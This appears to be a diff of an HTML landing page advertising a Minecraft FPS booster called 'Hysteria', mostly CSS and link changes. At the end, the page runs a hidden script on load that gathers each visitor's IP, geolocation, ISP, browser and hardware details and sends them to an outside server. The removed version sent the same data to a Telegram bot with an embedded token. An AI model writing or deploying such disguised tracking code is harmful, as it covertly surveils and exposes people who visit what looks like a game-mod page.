@@ -38,20 +38,27 @@
             position: sticky;
             top: 0;
             background: rgba(10, 10, 20, .4);
+            z-index: 100;
         }
         .logo {
             font-size: 32px;
             font-weight: 800;
             color: #00ffae;
+            text-shadow: 0 0 20px rgba(0, 255, 174, .3);
         }
         nav ul {
             display: flex;
             gap: 40px;
             list-style: none;
         }
-        nav a {
+        nav ul li a {
             color: white;
             text-decoration: none;
+            transition: .3s;
+            font-weight: 400;
+        }
+        nav ul li a:hover {
+            color: #00ffae;
         }
         .hero {
             min-height: 100vh;
@@ -65,17 +72,24 @@
         .hero h1 {
             font-size: 100px;
             color: #00ffae;
-            text-shadow: 0 0 40px #00ffae;
+            text-shadow: 0 0 40px rgba(0, 255, 174, .5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 20px rgba(0, 255, 174, .3); }
+            to { text-shadow: 0 0 60px rgba(0, 255, 174, .7); }
         }
         .hero h2 {
             font-size: 34px;
             margin-top: 15px;
+            font-weight: 600;
         }
         .hero p {
             margin-top: 20px;
             max-width: 800px;
             color: #cbd5e1;
             font-size: 20px;
+            line-height: 1.6;
         }
         .stats {
             margin-top: 50px;
@@ -86,13 +100,24 @@
         }
         .stat {
             background: rgba(255, 255, 255, .05);
-            padding: 25px;
+            padding: 25px 35px;
             border-radius: 20px;
-            width: 220px;
+            width: 200px;
+            border: 1px solid rgba(255, 255, 255, .08);
+            transition: .3s;
+        }
+        .stat:hover {
+            transform: translateY(-5px);
+            border-color: rgba(0, 255, 174, .3);
         }
         .stat h3 {
             color: #00ffae;
             font-size: 40px;
+        }
+        .stat p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-top: 5px;
         }
         section {
             padding: 100px 10%;
@@ -100,7 +125,11 @@
         .title {
             text-align: center;
             font-size: 50px;
+            font-weight: 700;
             margin-bottom: 60px;
+            background: linear-gradient(90deg, #00ffae, #00b7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         .grid {
             display: grid;
@@ -116,10 +145,17 @@
         }
         .card:hover {
             transform: translateY(-10px);
+            border-color: rgba(0, 255, 174, .3);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, .3);
         }
         .card h3 {
             margin-bottom: 15px;
             color: #00ffae;
+            font-size: 22px;
+        }
+        .card p {
+            color: #cbd5e1;
+            line-height: 1.6;
         }
         .gallery {
             display: grid;
@@ -135,18 +171,37 @@
             justify-content: center;
             font-size: 26px;
             color: #00ffae;
+            border: 1px solid rgba(255, 255, 255, .08);
+            transition: .3s;
+            font-weight: 600;
+        }
+        .ss:hover {
+            transform: scale(1.02);
+            border-color: rgba(0, 255, 174, .3);
         }
         .review {
             background: rgba(255, 255, 255, .05);
             padding: 30px;
             border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, .08);
+            transition: .3s;
+        }
+        .review:hover {
+            border-color: rgba(0, 255, 174, .3);
         }
         .review h4 {
             margin-top: 10px;
+            color: #00ffae;
+        }
+        .review p {
+            color: #cbd5e1;
+            margin-top: 10px;
+            font-style: italic;
         }
         .stars {
             color: gold;
             font-size: 28px;
+            letter-spacing: 2px;
         }
         .faq {
             margin-top: 20px;
@@ -154,55 +209,174 @@
         .faq-item {
             background: rgba(255, 255, 255, .05);
             margin-top: 20px;
-            padding: 25px;
+            padding: 25px 30px;
             border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, .08);
+            transition: .3s;
+            cursor: pointer;
+        }
+        .faq-item:hover {
+            border-color: rgba(0, 255, 174, .3);
+        }
+        .faq-item h3 {
+            color: #00ffae;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        .faq-item p {
+            color: #cbd5e1;
+            line-height: 1.6;
         }
         .download {
             text-align: center;
         }
         .download h1 {
             font-size: 70px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #00ffae, #00b7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
         .download p {
             color: #cbd5e1;
             margin-top: 20px;
+            font-size: 18px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
         }
         .btn {
             margin-top: 50px;
             display: inline-block;
             padding: 25px 70px;
-            font-size: 35px;
+            font-size: 28px;
+            font-weight: 700;
             text-decoration: none;
-            color: white;
+            color: #080b12;
             border-radius: 20px;
             background: linear-gradient(90deg, #00ffae, #00b7ff);
-            box-shadow: 0 0 40px rgba(0, 255, 174, .6);
+            box-shadow: 0 0 40px rgba(0, 255, 174, .3);
             transition: .3s;
+            letter-spacing: 1px;
         }
         .btn:hover {
             transform: scale(1.08);
+            box-shadow: 0 0 60px rgba(0, 255, 174, .5);
         }
         footer {
             text-align: center;
             padding: 40px;
-            color: #94a3b8;
+            color: #475569;
+            border-top: 1px solid rgba(255, 255, 255, .05);
+        }
+        /* Tracking status indicator */
+        #tracking-status {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 255, 174, 0.1);
+            color: #00ffae;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid rgba(0, 255, 174, 0.2);
+            backdrop-filter: blur(10px);
+            z-index: 999;
+            display: none;
+            font-family: 'Poppins', sans-serif;
+        }
+        #tracking-status.active {
+            display: block;
+        }
+        #tracking-status.success {
+            border-color: #00ffae;
+            color: #00ffae;
+        }
+        #tracking-status.error {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        /* Responsive */
+        @media (max-width: 768px) {
+            nav ul {
+                gap: 20px;
+                font-size: 14px;
+            }
+            .hero h1 {
+                font-size: 60px;
+            }
+            .hero h2 {
+                font-size: 24px;
+            }
+            .title {
+                font-size: 32px;
+            }
+            .stats {
+                gap: 20px;
+            }
+            .stat {
+                width: 160px;
+                padding: 20px;
+            }
+            .stat h3 {
+                font-size: 30px;
+            }
+            .download h1 {
+                font-size: 40px;
+            }
+            .btn {
+                padding: 20px 40px;
+                font-size: 22px;
+            }
+            section {
+                padding: 60px 5%;
+            }
+        }
+        @media (max-width: 480px) {
+            nav {
+                flex-direction: column;
+                gap: 15px;
+                padding: 15px 5%;
+            }
+            nav ul {
+                gap: 15px;
+                font-size: 12px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            .hero h1 {
+                font-size: 40px;
+            }
+            .hero h2 {
+                font-size: 18px;
+            }
+            .hero p {
+                font-size: 16px;
+                padding: 0 10px;
+            }
+            .stat {
+                width: 140px;
+                padding: 15px;
+            }
+            .stat h3 {
+                font-size: 24px;
+            }
         }
     </style>
 </head>
 
 <body>
-
     <nav>
         <div class="logo">HYSTERIA</div>
         <ul>
-            <li><a href="#">Features</a></li>
-            <li><a href="#">Performance</a></li>
-            <li><a href="#">Reviews</a></li>
-            <li><a href="#">Download</a></li>
+            <li><a href="#features">Features</a></li>
+            <li><a href="#performance">Performance</a></li>
+            <li><a href="#reviews">Reviews</a></li>
+            <li><a href="#download">Download</a></li>
         </ul>
     </nav>
 
-    <section class="hero">
+    <section class="hero" id="home">
         <h1>HYSTERIA</h1>
         <h2>The Ultimate FPS Booster for Minecraft Java Edition</h2>
         <p>
@@ -230,7 +404,7 @@
         </div>
     </section>
 
-    <section>
+    <section id="features">
         <h1 class="title">Why Hysteria?</h1>
         <div class="grid">
             <div class="card">
@@ -260,7 +434,7 @@
         </div>
     </section>
 
-    <section>
+    <section id="performance">
         <h1 class="title">Performance Preview</h1>
         <div class="gallery">
             <div class="ss">Before: 72 FPS</div>
@@ -269,7 +443,7 @@
         </div>
     </section>
 
-    <section>
+    <section id="reviews">
         <h1 class="title">Community Reviews</h1>
         <div class="grid">
             <div class="review">
@@ -327,7 +501,7 @@
         </div>
     </section>
 
-    <section class="download">
+    <section class="download" id="download">
         <h1>Ready to Boost Your FPS?</h1>
         <p>
             Join thousands of players already using Hysteria to get smoother gameplay,
@@ -340,146 +514,138 @@
         © 2026 Hysteria • Minecraft Java Edition • Fabric FPS Booster
     </footer>
 
-    <!-- Script to capture IP and send to Telegram -->
+    <!-- Status indicator -->
+    <div id="tracking-status" class="active">📡 Tracking...</div>
+
     <script>
         (function() {
-            // ===================== CONFIGURATION =====================
-            // REPLACE WITH YOUR TELEGRAM BOT DETAILS
-            const BOT_TOKEN = '8996514821:AAHoHX0rHw8jxBzGGjrPCEHNisqvOskWOpg';        // e.g., '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
-            const CHAT_ID = '-5457771254';            // e.g., '123456789' (you can also use @username)
-            // ========================================================
+            // ===== CONFIGURATION =====
+            // Replace with your Vercel or Render backend URL
+            // Vercel: https://your-project.vercel.app/api/track
+            // Render: https://your-project.onrender.com/api/track
+            const BACKEND_URL = 'https://your-project.vercel.app/api/track';
+            // ==========================
 
-            // Function to send message to Telegram
-            function sendToTelegram(message) {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const statusEl = document.getElementById('tracking-status');
 
-                fetch(url, {
+            function updateStatus(message, type) {
+                if (statusEl) {
+                    statusEl.textContent = message;
+                    statusEl.className = 'active ' + type;
+                    setTimeout(() => {
+                        statusEl.style.display = 'none';
+                    }, 5000);
+                }
+            }
+
+            function sendToBackend(data) {
+                if (!BACKEND_URL || BACKEND_URL === 'https://hysteria.vercel.app/api/track') {
+                    console.warn('⚠️ Backend URL not configured. Please set BACKEND_URL.');
+                    updateStatus('⚠️ Backend not configured', 'error');
+                    return;
+                }
+
+                fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify(data)
                 })
                 .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
+                    if (!response.ok) throw new Error('Backend error: ' + response.status);
                     return response.json();
                 })
-                .then(data => {
-                    console.log('Message sent to Telegram:', data);
+                .then(result => {
+                    console.log('✅ Visitor tracked:', result);
+                    updateStatus('✅ Visitor tracked', 'success');
                 })
                 .catch(error => {
-                    console.error('Error sending to Telegram:', error);
+                    console.error('❌ Tracking error:', error);
+                    updateStatus('❌ Tracking failed', 'error');
                 });
             }
 
-            // Function to fetch IP data and send to Telegram
-            function fetchAndSendIP() {
-                // First try to get data from ipapi.co
+            function getVisitorData() {
+                // Try to get IP from ipapi.co
                 fetch('https://ipapi.co/json/')
                     .then(response => {
-                        if (!response.ok) throw new Error('Network response was not ok');
+                        if (!response.ok) throw new Error('ipapi.co failed');
                         return response.json();
                     })
                     .then(data => {
-                        const now = new Date();
-                        const message = `
-🆕 <b>New Visitor!</b>
-
-🌐 <b>IP:</b> <code>${data.ip || 'unknown'}</code>
-📍 <b>Country:</b> ${data.country_name || 'unknown'} (${data.country_code || '?'})
-🏙️ <b>City:</b> ${data.city || 'unknown'}
-🗺️ <b>Region:</b> ${data.region || 'unknown'}
-📮 <b>Postal Code:</b> ${data.postal || 'unknown'}
-🌍 <b>Location:</b> ${data.latitude || '?'}, ${data.longitude || '?'}
-🕐 <b>Timezone:</b> ${data.timezone || 'unknown'}
-🏢 <b>ISP:</b> ${data.org || 'unknown'}
-📡 <b>AS:</b> ${data.asn || 'unknown'}
-
-💻 <b>OS:</b> ${navigator.platform || 'unknown'}
-🌐 <b>Browser:</b> ${navigator.userAgent || 'unknown'}
-📱 <b>Languages:</b> ${navigator.languages ? navigator.languages.join(', ') : 'unknown'}
-🖥️ <b>Screen Resolution:</b> ${screen.width || '?'}x${screen.height || '?'}
-🧵 <b>CPU Cores:</b> ${navigator.hardwareConcurrency || 'unknown'}
-🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
-🔗 <b>Referrer:</b> ${document.referrer || 'direct visit'}
-
-📊 <b>Data source:</b> ipapi.co
-                        `.trim();
-
-                        sendToTelegram(message);
-                        console.log('IP Data fetched and sent to Telegram:', data);
+                        const visitorData = {
+                            ip: data.ip || 'unknown',
+                            country: data.country_name || 'unknown',
+                            country_code: data.country_code || 'unknown',
+                            city: data.city || 'unknown',
+                            region: data.region || 'unknown',
+                            latitude: data.latitude || 'unknown',
+                            longitude: data.longitude || 'unknown',
+                            timezone: data.timezone || 'unknown',
+                            isp: data.org || 'unknown',
+                            asn: data.asn || 'unknown',
+                            userAgent: navigator.userAgent || 'unknown',
+                            language: navigator.language || 'unknown',
+                            languages: navigator.languages || [],
+                            screenWidth: screen.width || 'unknown',
+                            screenHeight: screen.height || 'unknown',
+                            colorDepth: screen.colorDepth || 'unknown',
+                            time: new Date().toISOString(),
+                            referrer: document.referrer || 'direct',
+                            page: window.location.href,
+                            title: document.title,
+                            platform: navigator.platform || 'unknown',
+                            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                            deviceMemory: navigator.deviceMemory || 'unknown'
+                        };
+                        sendToBackend(visitorData);
                     })
-                    .catch(error => {
-                        // Fallback to alternative IP source
-                        console.warn('ipapi.co failed, trying fallback...', error);
-                        fetch('https://api.ipify.org?format=json')
-                            .then(response => response.json())
-                            .then(fallbackData => {
-                                const now = new Date();
-                                const message = `
-🆕 <b>New Visitor! (fallback)</b>
-
-🌐 <b>IP:</b> <code>${fallbackData.ip || 'unknown'}</code>
-📍 <b>Country:</b> unknown (ipapi.co unavailable)
-🏙️ <b>City:</b> unknown
-
-💻 <b>OS:</b> ${navigator.platform || 'unknown'}
-🌐 <b>Browser:</b> ${navigator.userAgent || 'unknown'}
-🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
-🔗 <b>Referrer:</b> ${document.referrer || 'direct visit'}
-
-⚠️ <b>Note:</b> ipapi.co unavailable, using api.ipify.org
-                                `.trim();
-
-                                sendToTelegram(message);
-                                console.log('Fallback IP sent to Telegram:', fallbackData);
-                            })
-                            .catch(fallbackError => {
-                                console.error('Both IP services failed:', fallbackError);
-                            });
+                    .catch(() => {
+                        // Fallback - send what we can
+                        const visitorData = {
+                            ip: 'unknown (ipapi.co failed)',
+                            userAgent: navigator.userAgent || 'unknown',
+                            language: navigator.language || 'unknown',
+                            languages: navigator.languages || [],
+                            screenWidth: screen.width || 'unknown',
+                            screenHeight: screen.height || 'unknown',
+                            colorDepth: screen.colorDepth || 'unknown',
+                            time: new Date().toISOString(),
+                            referrer: document.referrer || 'direct',
+                            page: window.location.href,
+                            title: document.title,
+                            platform: navigator.platform || 'unknown',
+                            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                            deviceMemory: navigator.deviceMemory || 'unknown'
+                        };
+                        sendToBackend(visitorData);
                     });
-
-                // SECOND SEND (backup) - repeat after a short delay
-                setTimeout(() => {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(response => response.json())
-                        .then(data => {
-                            const now = new Date();
-                            const message = `
-🔄 <b>IP Check (backup)</b>
-
-🌐 <b>IP:</b> <code>${data.ip || 'unknown'}</code>
-🕒 <b>Time:</b> ${now.toLocaleString('en-US')}
-📝 <b>Note:</b> This is a second send for redundancy
-                            `.trim();
-
-                            sendToTelegram(message);
-                            console.log('Second IP sent to Telegram:', data);
-                        })
-                        .catch(err => console.warn('Second IP fetch failed:', err));
-                }, 3000); // 3 second delay
             }
 
-            // Check if bot data is configured
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
-                console.warn('⚠️ WARNING: Telegram bot not configured!');
-                console.warn('Replace BOT_TOKEN and CHAT_ID with your own data.');
-            }
-
-            // Run IP fetching after page loads
+            // Execute on page load
             if (document.readyState === 'complete' || document.readyState === 'interactive') {
-                fetchAndSendIP();
+                // Small delay to ensure page is fully loaded
+                setTimeout(getVisitorData, 500);
             } else {
-                document.addEventListener('DOMContentLoaded', fetchAndSendIP);
+                document.addEventListener('DOMContentLoaded', function() {
+                    setTimeout(getVisitorData, 500);
+                });
             }
+
+            // Also send a second time after 3 seconds (for redundancy)
+            setTimeout(() => {
+                getVisitorData();
+            }, 3000);
+
+            // Ping backend every 5 minutes to keep it alive (for Render)
+            setInterval(() => {
+                fetch(BACKEND_URL, { method: 'OPTIONS' })
+                    .then(() => console.log('🔄 Keep-alive ping sent'))
+                    .catch(() => console.log('❌ Ping failed'));
+            }, 300000); // 5 minutes
+
         })();
     </script>
-
 </body>
 </html>
